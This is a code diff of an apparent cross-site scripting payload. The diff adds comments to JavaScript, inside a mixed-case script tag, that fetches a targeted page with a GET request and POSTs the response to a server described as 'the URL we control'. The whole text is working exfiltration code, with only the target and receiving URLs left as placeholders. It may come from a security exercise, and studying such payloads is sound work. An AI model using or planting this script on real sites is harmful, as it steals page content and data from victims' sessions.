@@ -1,20 +1,20 @@
 <ScRiPt>
 function sendToServer(token){
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", POST_URL, true);
+    xhr.open("POST", POST_URL, true); //Initializing POST request on the URL we control
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    xhr.send("HTML=" + token);
+    xhr.send("HTML=" + token); //Get the code
 }
 
 
 function getContentPage() {
-    var xhr = new XMLHttpRequest();
+    var xhr = new XMLHttpRequest(); 
     // true on the end of here makes the call asynchronous
-    xhr.open("GET", TARGET_URL, true);
+    xhr.open("GET", TARGET_URL, true); //initializing GET request on the targeted URL
     xhr.onreadystatechange = function () {
         if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            input = xhr.response;
-            sendToServer(input);
+            input = xhr.response; //In case if I have a success, store the response to the variable input
+            sendToServer(input); //send the response the function
         }
     };
     // Make the request
